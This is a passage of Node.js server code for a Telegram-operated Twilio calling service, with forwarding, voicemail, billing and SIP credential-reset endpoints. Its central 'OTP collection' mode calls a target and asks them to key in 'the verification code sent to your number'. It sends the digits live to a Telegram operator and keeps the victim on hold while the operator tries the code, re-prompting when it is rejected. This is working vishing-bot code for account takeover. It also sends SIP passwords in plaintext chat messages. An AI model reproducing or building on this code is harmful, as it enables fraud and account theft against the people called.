    const gather = response.gather({ action: gatherUrl, method: 'POST', numDigits: 1, timeout: 8, finishOnKey: '' })
    if (audioProxyUrl) {
      gather.play(audioProxyUrl)
    } else {
      gather.say({ voice: twilioVoice }, 'Thank you for your time. Press 1 to continue.')
    }

    // Retry once
    const gather2 = response.gather({ action: gatherUrl, method: 'POST', numDigits: 1, timeout: 5, finishOnKey: '' })
    if (audioProxyUrl) {
      gather2.play(audioProxyUrl)
    } else {
      gather2.say({ voice: twilioVoice }, 'Press 1 to continue or hang up.')
    }

    response.say({ voice: twilioVoice }, 'No input received. Goodbye.')
    response.hangup()

    log(`[SingleIVR] TwiML served for session=${sessionId} target=${session.targetNumber}`)
    res.type('text/xml').send(response.toString())
  } catch (error) {
    log('[SingleIVR] TwiML error:', error.message)
    const response = new VoiceResponse()
    response.say('An error occurred. Goodbye.')
    response.hangup()
    res.type('text/xml').send(response.toString())
  }
})

// TwiML: Handle DTMF digit press
app.post('/twilio/single-ivr-gather', async (req, res) => {
  const VoiceResponse = require('twilio').twiml.VoiceResponse
  try {
    const { sessionId } = req.query
    const digits = req.body?.Digits || ''
    const response = new VoiceResponse()
    const voiceService = require('./voice-service.js')
    const session = voiceService.twilioIvrSessions[sessionId]

    log(`[SingleIVR] Gather: session=${sessionId} digits=${digits}`)

    if (!session) {
      response.say('Goodbye.')
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    const twilioVoice = voiceService.getTwilioVoice(session.voiceName)
    session.digitPressed = digits

    if (digits && session.activeKeys.includes(digits)) {
      session.phase = 'transferring'

      // ── OTP Collection mode: redirect to OTP gather ──
      if (session.ivrMode === 'otp_collect') {
        session.phase = 'otp_gather'
        const selfUrl = process.env.SELF_URL_PROD || process.env.SELF_URL || ''
        response.redirect({ method: 'POST' }, `${selfUrl}/twilio/single-ivr-otp?sessionId=${encodeURIComponent(sessionId)}`)
        log(`[SingleIVR] OTP mode: redirecting to OTP gather for session=${sessionId}`)
        return res.type('text/xml').send(response.toString())
      }

      if (session.bulkMode === 'report_only' || !session.ivrNumber) {
        // Report-only: notify and end
        session.phase = 'completed'
        response.say({ voice: twilioVoice }, 'Thank you. Goodbye.')
        response.hangup()
        if (!session.campaignId) {
          bot?.sendMessage(session.chatId,
            `✅ <b>IVR Call — Key Pressed!</b>\n📞 ${session.targetNumber} pressed <b>${digits}</b>`,
            { parse_mode: 'HTML' }
          ).catch(() => {})
        }
      } else {
        // Transfer mode: connect to IVR number
        if (session.holdMusic) {
          response.play(`${SELF_URL}/assets/hold-music-jazz.mp3`)
        } else {
          response.say({ voice: twilioVoice }, 'Please hold while we connect you.')
        }
        const dial = response.dial({ callerId: session.callerId, timeout: 30 })
        dial.number(session.ivrNumber)
        log(`[SingleIVR] Transferring to ${session.ivrNumber}`)
      }
    } else {
      response.say({ voice: twilioVoice }, 'Invalid input. Goodbye.')
      response.hangup()
    }

    res.type('text/xml').send(response.toString())
  } catch (error) {
    log('[SingleIVR] Gather error:', error.message)
    const response = new VoiceResponse()
    response.say('An error occurred. Goodbye.')
    response.hangup()
    res.type('text/xml').send(response.toString())
  }
})

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// OTP Collection TwiML Endpoints (Single IVR)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

const OTP_HOLD_TIMEOUT_MS = 90000 // 90 seconds max hold while waiting for bot user decision
const OTP_HOLD_LOOP_SECONDS = 12  // Play hold music for 12 seconds per loop iteration

// TwiML: OTP Gather — prompt target to enter their verification code
app.post('/twilio/single-ivr-otp', async (req, res) => {
  const VoiceResponse = require('twilio').twiml.VoiceResponse
  try {
    const { sessionId } = req.query
    const response = new VoiceResponse()
    const voiceService = require('./voice-service.js')
    const session = voiceService.twilioIvrSessions[sessionId]

    if (!session) {
      response.say('Session expired. Goodbye.')
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    session.otpAttempt = (session.otpAttempt || 0) + 1
    session.otpStatus = null
    session.otpDigits = null
    session.phase = 'otp_gather'

    const selfUrl = process.env.SELF_URL_PROD || process.env.SELF_URL || ''
    const otpResultUrl = `${selfUrl}/twilio/single-ivr-otp-result?sessionId=${encodeURIComponent(sessionId)}`
    const otpLength = session.otpLength || 6

    log(`[SingleIVR-OTP] Gather: session=${sessionId} attempt=${session.otpAttempt}/${session.otpMaxAttempts || 3}`)

    // Use consistent voice matching the user's chosen IVR voice
    const twilioVoice = voiceService.getTwilioVoice(session.voiceName)

    // First gather attempt
    const gather = response.gather({
      action: otpResultUrl,
      method: 'POST',
      numDigits: otpLength,
      timeout: 15,
      finishOnKey: '#',
    })
    if (session.otpAttempt === 1) {
      gather.say({ voice: twilioVoice }, 'Please enter the verification code sent to your number, followed by the pound key.')
    } else {
      gather.say({ voice: twilioVoice }, 'Invalid code. Please re-enter the verification code sent to your number, followed by the pound key.')
    }

    // Retry gather if no input
    const gather2 = response.gather({
      action: otpResultUrl,
      method: 'POST',
      numDigits: otpLength,
      timeout: 10,
      finishOnKey: '#',
    })
    gather2.say({ voice: twilioVoice }, 'We did not receive your code. Please enter it now, followed by the pound key.')

    // No input after retries
    response.say({ voice: twilioVoice }, 'No code received. Goodbye.')
    response.hangup()

    res.type('text/xml').send(response.toString())
  } catch (error) {
    log('[SingleIVR-OTP] Gather error:', error.message)
    const response = new VoiceResponse()
    response.say('An error occurred. Goodbye.')
    response.hangup()
    res.type('text/xml').send(response.toString())
  }
})

// TwiML: OTP Result — collect OTP digits, notify bot user, enter hold loop
app.post('/twilio/single-ivr-otp-result', async (req, res) => {
  const VoiceResponse = require('twilio').twiml.VoiceResponse
  try {
    const { sessionId } = req.query
    const digits = req.body?.Digits || ''
    const response = new VoiceResponse()
    const voiceService = require('./voice-service.js')
    const session = voiceService.twilioIvrSessions[sessionId]

    log(`[SingleIVR-OTP] Result: session=${sessionId} digits=${digits} attempt=${session?.otpAttempt}`)

    if (!session) {
      response.say('Session expired. Goodbye.')
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    const twilioVoice = voiceService.getTwilioVoice(session.voiceName)

    if (!digits) {
      response.say({ voice: twilioVoice }, 'No code entered. Goodbye.')
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    // Store OTP and set pending review
    session.otpDigits = digits
    session.otpStatus = 'pending_review'
    session.otpHoldStartedAt = Date.now()
    session.phase = 'otp_hold'

    // ── Send Telegram notification to bot user with inline Confirm/Reject buttons ──
    const attemptText = session.otpAttempt > 1 ? ` (attempt ${session.otpAttempt}/${session.otpMaxAttempts || 3})` : ''
    try {
      await bot?.sendMessage(session.chatId,
        `🔑 <b>OTP Received!</b>${attemptText}\n\n` +
        `📞 From: <b>${session.targetNumber}</b>\n` +
        `🔢 Code: <code>${digits}</code>\n` +
        `📋 Template: ${session.templateName || 'Custom'}\n\n` +
        `Caller is on hold — verify the code:`,
        {
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '✅ Confirm', callback_data: `ivr_otp:confirm:${sessionId}` },
                { text: '❌ Reject', callback_data: `ivr_otp:reject:${sessionId}` },
              ]
            ]
          }
        }
      )
    } catch (e) {
      log(`[SingleIVR-OTP] Failed to send Telegram OTP notification: ${e.message}`)
    }

    // Redirect to hold loop
    const selfUrl = process.env.SELF_URL_PROD || process.env.SELF_URL || ''
    response.say({ voice: twilioVoice }, 'Thank you. Please hold while we verify your code.')
    response.redirect({ method: 'POST' }, `${selfUrl}/twilio/single-ivr-otp-hold?sessionId=${encodeURIComponent(sessionId)}`)

    res.type('text/xml').send(response.toString())
  } catch (error) {
    log('[SingleIVR-OTP] Result error:', error.message)
    const response = new VoiceResponse()
    response.say('An error occurred. Goodbye.')
    response.hangup()
    res.type('text/xml').send(response.toString())
  }
})

// TwiML: OTP Hold Loop — play hold music, check for bot user decision each iteration
app.post('/twilio/single-ivr-otp-hold', async (req, res) => {
  const VoiceResponse = require('twilio').twiml.VoiceResponse
  try {
    const { sessionId } = req.query
    const response = new VoiceResponse()
    const voiceService = require('./voice-service.js')
    const session = voiceService.twilioIvrSessions[sessionId]

    if (!session) {
      response.say('Session expired. Goodbye.')
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    const selfUrl = process.env.SELF_URL_PROD || process.env.SELF_URL || ''
    const holdElapsed = Date.now() - (session.otpHoldStartedAt || Date.now())

    log(`[SingleIVR-OTP] Hold: session=${sessionId} status=${session.otpStatus} elapsed=${Math.round(holdElapsed / 1000)}s`)

    // Use consistent voice matching user's IVR voice choice
    const twilioVoice = voiceService.getTwilioVoice(session.voiceName)

    // ── Check for timeout ──
    if (holdElapsed > OTP_HOLD_TIMEOUT_MS) {
      session.otpStatus = 'timeout'
      session.phase = 'completed'
      response.say({ voice: twilioVoice }, 'Verification timed out. Please try again later. Goodbye.')
      response.hangup()
      log(`[SingleIVR-OTP] Hold TIMEOUT for session=${sessionId}`)
      // Notify bot user
      bot?.sendMessage(session.chatId,
        `⏰ <b>OTP Verification Timed Out</b>\n📞 ${session.targetNumber}\n🔢 Code: <code>${session.otpDigits}</code>\n\nCaller was disconnected after ${Math.round(OTP_HOLD_TIMEOUT_MS / 1000)}s.`,
        { parse_mode: 'HTML' }
      ).catch(() => {})
      return res.type('text/xml').send(response.toString())
    }

    // ── Check for confirmed ──
    if (session.otpStatus === 'confirmed') {
      session.phase = 'completed'
      const confirmMsg = session.otpConfirmMsg || 'Your code has been verified successfully. Thank you. Goodbye.'
      response.say({ voice: twilioVoice }, confirmMsg)
      response.hangup()
      log(`[SingleIVR-OTP] CONFIRMED for session=${sessionId} digits=${session.otpDigits}`)
      return res.type('text/xml').send(response.toString())
    }

    // ── Check for rejected ──
    if (session.otpStatus === 'rejected') {
      const maxAttempts = session.otpMaxAttempts || 3
      if (session.otpAttempt >= maxAttempts) {
        session.phase = 'completed'
        const rejectMsg = session.otpRejectMsg || 'Maximum verification attempts reached. Goodbye.'
        response.say({ voice: twilioVoice }, rejectMsg)
        response.hangup()
        log(`[SingleIVR-OTP] MAX ATTEMPTS for session=${sessionId} (${session.otpAttempt}/${maxAttempts})`)
        // Notify bot user
        bot?.sendMessage(session.chatId,
          `🚫 <b>OTP Max Attempts Reached</b>\n📞 ${session.targetNumber}\n🔢 Last code: <code>${session.otpDigits}</code>\n\nCaller disconnected after ${maxAttempts} failed attempts.`,
          { parse_mode: 'HTML' }
        ).catch(() => {})
        return res.type('text/xml').send(response.toString())
      }
      // Retry — redirect to OTP gather for new attempt
      log(`[SingleIVR-OTP] REJECTED — retry ${session.otpAttempt + 1}/${maxAttempts} for session=${sessionId}`)
      response.redirect({ method: 'POST' }, `${selfUrl}/twilio/single-ivr-otp?sessionId=${encodeURIComponent(sessionId)}`)
      return res.type('text/xml').send(response.toString())
    }

    // ── Still pending — play hold music and loop ──
    response.play(`${selfUrl}/assets/hold-music-jazz.mp3`)
    response.pause({ length: 2 })
    response.redirect({ method: 'POST' }, `${selfUrl}/twilio/single-ivr-otp-hold?sessionId=${encodeURIComponent(sessionId)}`)

    res.type('text/xml').send(response.toString())
  } catch (error) {
    log('[SingleIVR-OTP] Hold error:', error.message)
    const response = new VoiceResponse()
    response.say('An error occurred. Goodbye.')
    response.hangup()
    res.type('text/xml').send(response.toString())
  }
})

// Status callback: track call outcome + bill minutes
app.post('/twilio/single-ivr-status', async (req, res) => {
  try {
    const { sessionId } = req.query
    const { CallSid, CallStatus, CallDuration } = req.body || {}
    const duration = parseInt(CallDuration || '0')
    const voiceService = require('./voice-service.js')
    const session = voiceService.twilioIvrSessions[sessionId]

    log(`[SingleIVR] Status: session=${sessionId} sid=${CallSid} status=${CallStatus} duration=${duration}s`)

    if (session && CallStatus === 'completed') {
      const durationStr = duration > 0 ? `${Math.ceil(duration / 60)} min` : 'brief'

      // Store last IVR call params for Redial feature
      voiceService.lastIvrCallParams.set(session.chatId, {
        callerId: session.callerId,
        targetNumber: session.targetNumber,
        ivrNumber: session.ivrNumber,
        audioUrl: session.audioUrl,
        activeKeys: session.activeKeys,
        templateName: session.templateName,
        placeholderValues: session.placeholderValues,
        voiceName: session.voiceName,
        holdMusic: session.holdMusic,
        ivrMode: session.ivrMode || 'transfer',
        otpLength: session.otpLength,
        otpMaxAttempts: session.otpMaxAttempts,
        otpConfirmMsg: session.otpConfirmMsg,
        otpRejectMsg: session.otpRejectMsg,
        callerProvider: 'twilio',
        timestamp: Date.now(),
      })

      // Check if user's plan allows Redial (Business only)
      let redialKeyboard = {}
      try {
        const userData = await get(phoneNumbersOf, session.chatId)
        const callerNum = (userData?.numbers || []).find(n => n.phoneNumber === session.callerId)
        if (callerNum && phoneConfig.canAccessFeature(callerNum.plan, 'ivrRedial')) {
          redialKeyboard = {
            reply_markup: {
              inline_keyboard: [[{ text: '🔁 Redial Same Number', callback_data: `ivr_redial:${session.chatId}` }]]
            }
          }
        }
      } catch (e) { /* no redial button on error */ }

      // OTP mode completion report
      if (session.ivrMode === 'otp_collect') {
        const otpResult = session.otpStatus === 'confirmed' ? '✅ Confirmed' : session.otpStatus === 'rejected' ? '❌ Rejected' : session.otpStatus === 'timeout' ? '⏰ Timed Out' : '—'
        bot?.sendMessage(session.chatId,
          `📊 <b>OTP Call Complete</b>\n📞 ${session.targetNumber}\n🔑 Mode: OTP Collection\n🔢 Last Code: <code>${session.otpDigits || 'None'}</code>\n📊 Result: ${otpResult}\n🔄 Attempts: ${session.otpAttempt || 0}/${session.otpMaxAttempts || 3}\n⏱️ Duration: ${durationStr}`,
          { parse_mode: 'HTML', ...redialKeyboard }
        ).catch(() => {})
      } else if (session.digitPressed) {
        bot?.sendMessage(session.chatId,
          `📊 <b>IVR Call Complete</b>\n📞 ${session.targetNumber}\n🔢 Pressed: <b>${session.digitPressed}</b>\n⏱️ Duration: ${durationStr}${session.phase === 'transferring' ? '\n🔗 Transferred to ' + session.ivrNumber : ''}`,
          { parse_mode: 'HTML', ...redialKeyboard }
        ).catch(() => {})
      } else {
        const reason = session.phase === 'playing' ? 'No key pressed' : 'Not answered'
        bot?.sendMessage(session.chatId,
          `📊 <b>IVR Call Complete</b>\n📞 ${session.targetNumber}\n❌ ${reason}\n⏱️ Duration: ${durationStr}`,
          { parse_mode: 'HTML', ...redialKeyboard }
        ).catch(() => {})
      }

      // Bill minutes using unified billing — min 1 min, always charged
      try {
        const minutes = Math.max(1, duration > 0 ? Math.ceil(duration / 60) : 1)
        await voiceService.billCallMinutesUnified(session.chatId, session.callerId, minutes, session.targetNumber, 'IVR_Outbound_Twilio')
      } catch (e) { log(`[SingleIVR] Minutes billing error: ${e.message}`) }

      setTimeout(() => { delete voiceService.twilioIvrSessions[sessionId] }, 30000)
    } else if (session && (CallStatus === 'no-answer' || CallStatus === 'busy' || CallStatus === 'failed' || CallStatus === 'canceled')) {
      const reason = CallStatus === 'no-answer' ? 'No Answer' : CallStatus === 'busy' ? 'Busy' : CallStatus === 'failed' ? 'Failed' : 'Cancelled'
      // BILLING FIX: Only charge for calls that were actually placed (no-answer/busy)
      // Do NOT charge for failed/canceled — call never connected
      const isBillable = CallStatus === 'no-answer' || CallStatus === 'busy'

      if (isBillable) {
        bot?.sendMessage(session.chatId,
          `📊 <b>IVR Call — ${reason}</b>\n📞 ${session.targetNumber}\n💰 Charged: $${voiceService.IVR_CALL_RATE.toFixed(2)} (1 min minimum)`,
          { parse_mode: 'HTML' }
        ).catch(() => {})

        // Bill minimum 1 minute for unanswered calls (no-answer/busy only)
        try {
          await voiceService.billCallMinutesUnified(session.chatId, session.callerId, 1, session.targetNumber, 'IVR_Outbound_Twilio')
        } catch (e) { log(`[SingleIVR] Unanswered billing error: ${e.message}`) }
      } else {
        // Failed/canceled — no charge, call never connected
        log(`[SingleIVR] IVR call NOT billed — ${reason} (call never connected, no carrier charge)`)
        bot?.sendMessage(session.chatId,
          `📊 <b>IVR Call — ${reason}</b>\n📞 ${session.targetNumber}\n🚫 No charge (call never connected)`,
          { parse_mode: 'HTML' }
        ).catch(() => {})
      }

      setTimeout(() => { delete voiceService.twilioIvrSessions[sessionId] }, 5000)
    }

    res.sendStatus(200)
  } catch (error) {
    log('[SingleIVR] Status error:', error.message)
    res.sendStatus(200)
  }
})

// Twilio Dial Status Callback — handles forwarded call result (no answer → voicemail)
// Also handles SIP bridge and SIP outbound call results
app.post('/twilio/voice-dial-status', async (req, res) => {
  const VoiceResponse = require('twilio').twiml.VoiceResponse
  const voiceService = require('./voice-service.js')
  try {
    const { DialCallStatus, DialCallDuration, CallSid } = req.body || {}
    const { chatId: rawChatId, from, to, type } = req.query || {}
    const chatId = rawChatId ? parseInt(rawChatId) : null
    const response = new VoiceResponse()

    log(`[Twilio] Dial status: ${DialCallStatus} (${DialCallDuration || 0}s) chatId=${chatId} type=${type || 'forward'} sid=${CallSid || '?'}`)

    if (DialCallStatus === 'completed') {
      // Call was answered and completed — bill using unified billing (plan minutes first, then wallet overage)
      const duration = parseInt(DialCallDuration || '0')
      const minutes = duration > 0 ? Math.ceil(duration / 60) : 0
      if (minutes > 0 && chatId && to) {
        try {
          const decodedTo = decodeURIComponent(to)
          // Determine destination for rate calculation
          const destination = type === 'sip_bridge' || type === 'sip_outbound'
            ? decodeURIComponent(from || '')
            : ''  // Will be resolved inside billing
          // Try unified billing first
          const userData = await get(phoneNumbersOf, chatId)
          const numbers = userData?.numbers || []
          const num = numbers.find(n => n.phoneNumber === decodedTo && n.provider === 'twilio')
          if (num) {
            const fwdDest = destination || (num.features?.callForwarding?.forwardTo || decodeURIComponent(from || ''))
            const callType = type === 'sip_bridge' ? 'Twilio_SIP_Bridge' : type === 'sip_outbound' ? 'Twilio_SIP_Outbound' : 'Twilio_Forwarding'
            const billingInfo = await voiceService.billCallMinutesUnified(chatId, num.phoneNumber, minutes, fwdDest, callType)
            const remaining = billingInfo.limit > 0 ? Math.max(0, billingInfo.limit - billingInfo.used) : null
            const planLine = remaining !== null
              ? `${minutes} min · <b>${remaining}/${billingInfo.limit}</b> remaining`
              : `${minutes} min`
            const overageLine = billingInfo.overageCharge > 0
              ? `\n💰 Overage: $${billingInfo.overageCharge.toFixed(2)} from wallet`
              : ''
            const label = type === 'sip_bridge' ? 'SIP Bridge Call' : type === 'sip_outbound' ? 'SIP Outbound Call' : 'Forwarded Call'
            log(`[Twilio] ${label} billed via unified: ${minutes} min (${billingInfo.planMinUsed} plan + ${billingInfo.overageMin} overage)`)
            // Mark this CallSid as already billed — voice-status must skip it
            if (CallSid) _twilioBilledCallSids.add(CallSid)
            bot?.sendMessage(chatId, `📞 <b>${label} Ended</b>\n📲 ${fwdDest ? phoneConfig.formatPhone(fwdDest) : ''}\n⏱️ ${planLine}${overageLine}`, { parse_mode: 'HTML' }).catch(() => {})
          }
        } catch (e) { log(`[Twilio] Call billing error: ${e.message}`) }
      }
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    // Call was not answered (no-answer, busy, failed, canceled)
    const decodedFrom = decodeURIComponent(from || 'unknown')
    const decodedTo = decodeURIComponent(to || '')

    // For SIP bridge/outbound calls: bill 1-min minimum + notify user about the failure
    if (type === 'sip_bridge' || type === 'sip_outbound') {
      const label = type === 'sip_bridge' ? 'SIP Bridge Call' : 'SIP Outbound Call'
      const reason = DialCallStatus === 'no-answer' ? 'No answer'
        : DialCallStatus === 'busy' ? 'Line busy'
        : DialCallStatus === 'failed' ? 'Call failed'
        : DialCallStatus === 'canceled' ? 'Cancelled'
        : DialCallStatus || 'Unknown'

      // Bill 1-minute minimum for unanswered outbound calls
      // BILLING FIX: Do NOT charge for 'failed' or 'canceled' — call never connected (network error / user cancel)
      // Only charge for 'no-answer' and 'busy' — call was placed, carrier charges apply
      const isBillable = DialCallStatus === 'no-answer' || DialCallStatus === 'busy'
      let chargeLine = ''
      if (isBillable && chatId && to) {
        try {
          const decodedToNum = decodeURIComponent(to)
          const destination = decodeURIComponent(from || '')
          const userData = await get(phoneNumbersOf, chatId)
          const numbers = userData?.numbers || []
          const num = numbers.find(n => n.phoneNumber === decodedToNum && n.provider === 'twilio')
          if (num) {
            const fwdDest = destination || (num.features?.callForwarding?.forwardTo || '')
            const callType = type === 'sip_bridge' ? 'Twilio_SIP_Bridge' : 'Twilio_SIP_Outbound'
            const billingInfo = await voiceService.billCallMinutesUnified(chatId, num.phoneNumber, 1, fwdDest, callType)
            if (billingInfo.overageCharge > 0) {
              chargeLine = `\n💰 Charged: $${billingInfo.rate.toFixed(2)} (1 min minimum)`
            }
            log(`[Twilio] ${label} unanswered billed: 1 min minimum @ $${billingInfo.rate} — ${reason}`)
          } else {
            log(`[Twilio] ${label} unanswered billing skipped — number not found for ${decodedToNum}`)
          }
        } catch (e) { log(`[Twilio] ${label} unanswered billing error: ${e.message}`) }
      } else if (!isBillable) {
        log(`[Twilio] ${label} NOT billed — ${reason} (call never connected, no carrier charge)`)
      }

      bot?.sendMessage(chatId, `❌ <b>${label} Failed</b>\n📲 ${decodedFrom} — ${reason}${chargeLine}`, { parse_mode: 'HTML' }).catch(() => {})
      response.say(`The call could not be completed. ${reason}.`)
      response.hangup()
      return res.type('text/xml').send(response.toString())
    }

    // For forwarded calls: check if voicemail is enabled
    if (chatId && to) {
      const userData = await get(phoneNumbersOf, chatId)
      const numbers = userData?.numbers || []
      const num = numbers.find(n => n.phoneNumber === decodedTo && n.provider === 'twilio')
      const vmConfig = num?.features?.voicemail

      // Notify user about the forward failure
      const fwdTo = num?.features?.callForwarding?.forwardTo || 'unknown'
      const reason = DialCallStatus === 'no-answer' ? 'No answer'
        : DialCallStatus === 'busy' ? 'Line busy'
        : DialCallStatus === 'failed' ? 'Call failed'
        : DialCallStatus === 'canceled' ? 'Cancelled'
        : DialCallStatus || 'Unknown'
      bot?.sendMessage(chatId, `❌ <b>Forward Failed</b> — ${reason}\nFrom: ${decodedFrom}\n📲 ${fwdTo} didn't answer`, { parse_mode: 'HTML' }).catch(() => {})

      if (vmConfig?.enabled) {
        if (vmConfig.greetingType === 'custom' && vmConfig.customAudioGreetingUrl) {
          response.play(vmConfig.customAudioGreetingUrl)
        } else if (vmConfig.greetingType === 'custom' && vmConfig.customGreetingText) {
          response.say(vmConfig.customGreetingText)
        } else {
          response.say('The person you are calling is unavailable. Please leave a message after the beep.')
        }
        response.record({
          maxLength: 120,
          action: `${SELF_URL}/twilio/voicemail-complete?chatId=${chatId}&from=${encodeURIComponent(from || '')}&to=${encodeURIComponent(to || '')}`,
          transcribe: false,
          playBeep: true,
          timeout: 5
        })
        response.say('No message recorded. Goodbye.')
        response.hangup()
        return res.type('text/xml').send(response.toString())
      }

      // No voicemail — just end
    }

    response.say('The person you are calling is unavailable. Goodbye.')
    response.hangup()
    res.type('text/xml').send(response.toString())
  } catch (error) {
    log('[Twilio] Dial status error:', error.message)
    const VR = new VoiceResponse()
    VR.hangup()
    res.type('text/xml').send(VR.toString())
  }
})

// Twilio Voicemail Recording Complete
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// Phone SIP Credential Reset — regenerate both Twilio + Telnyx credentials
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
app.post('/phone/reset-credentials', async (req, res) => {
  try {
    // Security: Require admin key OR valid internal request to prevent unauthorized credential resets
    const adminKey = req?.headers?.['x-admin-key'] || req?.query?.key
    if (adminKey !== process.env.SESSION_SECRET?.slice(0, 16)) {
      return res.status(403).json({ error: 'Unauthorized' })
    }
    const { chatId, phoneNumber } = req.body || {}
    if (!chatId || !phoneNumber) {
      return res.status(400).json({ error: 'chatId and phoneNumber required' })
    }

    const userData = await get(phoneNumbersOf, chatId)
    if (!userData?.numbers) return res.status(404).json({ error: 'No phone numbers found' })

    const numIdx = userData.numbers.findIndex(n => n.phoneNumber === phoneNumber && n.status === 'active')
    if (numIdx === -1) return res.status(404).json({ error: 'Phone number not found or not active' })

    const num = userData.numbers[numIdx]
    const oldSipUsername = num.sipUsername
    const oldTelnyxCredentialId = num.telnyxCredentialId

    // 1. Remove old Twilio credential
    if (twilioResources?.credentialListSid && oldSipUsername) {
      await twilioService.removeSipCredential(twilioResources.credentialListSid, oldSipUsername)
    }

    // 2. Delete old Telnyx credential
    if (oldTelnyxCredentialId) {
      await telnyxApi.deleteSIPCredential(oldTelnyxCredentialId)
    }

    // 3. Generate new credentials
    const newSeedUser = phoneConfig.generateSipUsername()
    const newSeedPass = phoneConfig.generateSipPassword()
    let newTelnyxSipUsername = null
    let newTelnyxSipPassword = null
    let newTelnyxCredentialId = null

    // 4. Create new Telnyx credential
    if (telnyxResources?.sipConnectionId) {
      const telnyxCred = await telnyxApi.createSIPCredential(telnyxResources.sipConnectionId, newSeedUser, newSeedPass)
      if (telnyxCred?.sip_username) {
        newTelnyxSipUsername = telnyxCred.sip_username
        newTelnyxSipPassword = telnyxCred.sip_password || newSeedPass
        newTelnyxCredentialId = telnyxCred.id || null
        log(`[CloudPhone] Reset: Telnyx SIP credential created: ${newTelnyxSipUsername}`)
      }
    }

    // 5. Create new Twilio credential
    if (twilioResources?.credentialListSid) {
      await twilioService.addSipCredential(twilioResources.credentialListSid, newSeedUser, newSeedPass)
    }

    // 6. Update DB — Use Telnyx username as primary since domain is sip.speechcue.com
    userData.numbers[numIdx].sipUsername = newTelnyxSipUsername || newSeedUser
    userData.numbers[numIdx].sipPassword = newTelnyxSipPassword || newSeedPass
    userData.numbers[numIdx].telnyxSipUsername = newTelnyxSipUsername
    userData.numbers[numIdx].telnyxSipPassword = newTelnyxSipPassword
    userData.numbers[numIdx].telnyxCredentialId = newTelnyxCredentialId
    await set(phoneNumbersOf, chatId, userData)

    log(`[CloudPhone] SIP credentials reset for ${phoneNumber} (chatId: ${chatId}): Twilio=${newSeedUser}, Telnyx=${newTelnyxSipUsername || 'none'}`)

    // 7. Notify user via Telegram
    bot?.sendMessage(chatId,
      `🔑 <b>SIP Credentials Reset</b>\n\n📱 Number: <code>${phoneNumber}</code>\n👤 SIP User: <code>${newTelnyxSipUsername || newSeedUser}</code>\n🔒 SIP Pass: <code>${newSeedPass}</code>\n🌐 Domain: <code>${phoneConfig.SIP_DOMAIN}</code>\n\nUse these credentials in your softphone app.`,
      { parse_mode: 'HTML' }
    ).catch(() => {})

    res.json({
      success: true,
      sipUsername: newSeedUser,
      sipPassword: newSeedPass,
      telnyxSipUsername: newTelnyxSipUsername,
      telnyxSipPassword: newTelnyxSipPassword,
      sipDomain: phoneConfig.SIP_DOMAIN,
    })
  } catch (e) {
    log(`[CloudPhone] Reset credentials error: ${e.message}`)
    res.status(500).json({ error: 'Failed to reset credentials' })
  }
})

app.post('/twilio/voicemail-complete', async (req, res) => {
  const VoiceResponse = require('twilio').twiml.VoiceResponse
  const voiceService = require('./voice-service.js')
  try {
    const { RecordingUrl, RecordingDuration, RecordingSid, CallSid } = req.body || {}
    const { chatId: rawChatId, from, to } = req.query || {}
    const chatId = rawChatId ? parseInt(rawChatId) : null
    const decodedFrom = decodeURIComponent(from || 'unknown')
    const decodedTo = decodeURIComponent(to || '')
    log(`[Twilio] Voicemail recorded: ${RecordingSid} (${RecordingDuration}s) for chatId=${chatId}`)

    if (chatId && RecordingUrl) {
      const duration = parseInt(RecordingDuration || '0')
      const audioUrl = `${RecordingUrl}.mp3`

      // ━━━ BILL VOICEMAIL: Same inbound rates as regular calls ━━━
      // Minimum 1 minute (covers greeting playback + recording time)
      const minutesBilled = Math.max(1, Math.ceil(duration / 60))
      let billingLine = ''
      try {
        const userData = await get(phoneNumbersOf, chatId)
        const numbers = userData?.numbers || []
        const num = numbers.find(n => n.phoneNumber === decodedTo && n.provider === 'twilio')
        if (num) {
          const billingInfo = await voiceService.billCallMinutesUnified(chatId, num.phoneNumber, minutesBilled, decodedFrom, 'Twilio_Voicemail')
          const remaining = billingInfo.limit > 0 ? Math.max(0, billingInfo.limit - billingInfo.used) : null
          billingLine = remaining !== null
            ? `\n📊 ${minutesBilled} min · <b>${remaining}/${billingInfo.limit}</b> remaining`
            : `\n📊 ${minutesBilled} min used`
          if (billingInfo.overageCharge > 0) {
            billingLine += `\n💰 Overage: $${billingInfo.overageCharge.toFixed(2)} from wallet`
          }
          log(`[Twilio] Voicemail billed: ${minutesBilled} min (${billingInfo.planMinUsed} plan + ${billingInfo.overageMin} overage) for ${decodedTo}`)
          // Mark CallSid as billed — prevent double-billing from /twilio/voice-status
          if (CallSid) _twilioBilledCallSids.add(CallSid)
        }
      } catch (e) { log(`[Twilio] Voicemail billing error: ${e.message}`) }

      // Send voicemail + billing notification to Telegram
      bot?.sendMessage(chatId, `🎤 <b>New Voicemail</b>\nFrom: ${decodedFrom}\nTo: ${decodedTo}\nDuration: ${duration}s${billingLine}`, { parse_mode: 'HTML' }).catch(() => {})
      bot?.sendAudio(chatId, audioUrl, { caption: `Voicemail from ${decodedFrom} (${duration}s)` }).catch((e) => {
        // If audio send fails, send URL as message
        bot?.sendMessage(chatId, `🎤 Voicemail audio: ${audioUrl}`, { parse_mode: 'HTML' }).catch(() => {})
      })

      // Store voicemail record
      await db.collection('phoneLogs').insertOne({
        chatId: parseFloat(chatId),
        type: 'voicemail',
        provider: 'twilio',
        from: decodedFrom,
        to: decodedTo,
        recordingUrl: audioUrl,
        recordingSid: RecordingSid,
        duration,
        minutesBilled,
        timestamp: new Date().toISOString()
      })
    }

    const response = new VoiceResponse()
    response.say('Your message has been recorded. Goodbye.')
    response.hangup()
    res.type('text/xml').send(response.toString())
  } catch (error) {
    log('[Twilio] Voicemail complete error:', error.message)
    const VR = new VoiceResponse()
    VR.hangup()
    res.type('text/xml').send(VR.toString())
  }
})

